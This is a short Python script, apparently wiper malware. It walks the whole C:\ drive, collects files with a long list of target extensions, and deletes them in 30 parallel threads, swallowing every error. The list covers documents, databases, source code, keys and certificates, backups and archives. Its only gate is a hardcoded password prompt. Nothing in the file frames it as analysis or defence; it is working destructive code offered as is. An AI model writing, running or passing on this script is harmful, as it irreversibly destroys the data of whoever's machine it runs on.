import os
from queue import Queue
from threading import Thread

# Safegaurd
safeguard = input('Please put password in to start the program: ')
if safeguard != 'Seraphim':
    quit()

# File extensions to locate files
incinerated_ext = ('.txt', '.png', '.jpg', '.jpeg', '.der',
                   '.pfx', '.key', '.crt', '.csr', '.pem',
                   '.odt', '.ott', '.sxw', '.stw', '.uot',
                   '.max', '.ods', '.ots', '.sxc', '.stc',
                   '.dif', '.slk', '.odp', '.otp', '.sxd',
                   'std', '.uop', '.odg', '.otg', '.sxm',
                   '.mml', '.lay', '.lay6', '.asc', '.sqlite3',
                   '.sqlitedb', '.sql', '.accdb', '.mdb', '.dfb',
                   '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf',
                   '.ldf', '.sln', '.suo', '.cpp', '.pas', '.asm',
                   '.cmd', '. bat', '.vbs', '.dip', '.dch', '.sch',
                   '.brd', '.jsp', '.php', '.asp', '.java', '.jar',
                   '.class', '.wav', '.swf', '.fla', '.wmv', '.mpg',
                   ',vob', '.mpeg', '.asf', '.avi', '.mov', '.mkv',
                   '.flv', '.wma', '.mid', '.djvu', '.svg', '.psd',
                   '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif',
                   '.bmp', '.vcd', '.iso', '.backup', '.zip', '.rar',
                   '.tgz', '.tar', '.bak', '.tbk', '.paq', '.arc',
                   '.aes', '.gpg', '.wmx', '.wmdk', '.vdi', '.sldm',
                   '.sldx', '.sti', '.sxi', '.hwp', '.snt', '.onetoc2',
                   '.dwg', '.pdf', '.wks', '.rtf', '.csv', '.vsdx',
                   '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst',
                   '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps',
                   '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx',
                   '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx',
                   '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx',
                   '.doc')

# Grab all file from the machine
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in incinerated_ext:
            file_paths.append(root+'\\'+file)


def incinerate():
    while q.not_empty:
        file = q.get()
        try:
            os.remove(file)
        except:
            pass
        q.task_done()


q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=incinerate, daemon=True)
    thread.start()

q.join()
